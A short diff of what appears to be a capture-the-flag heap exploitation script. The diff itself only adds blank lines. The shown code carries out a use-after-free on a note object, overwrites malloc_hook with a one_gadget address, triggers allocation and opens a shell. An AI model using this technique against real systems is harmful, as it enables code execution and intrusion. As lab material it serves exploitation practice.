@@ -111,10 +111,12 @@ dbg("one_gadget")
 _, A = create_note(0x10, b'A' * 0xf)
 delete_note(A)
 edit_note(A, pQ(malloc_hook)* 2)
+
 _, X = create_note(0x10, b'\n')
 _, Y = create_note(0x10, pQ(one_gadget) + b'\n')
 input('gdb?')
 # trigger malloc_hook
+
 sendline(f, '1')
 sendline_after(f, ':', str(1))
 shell(s)
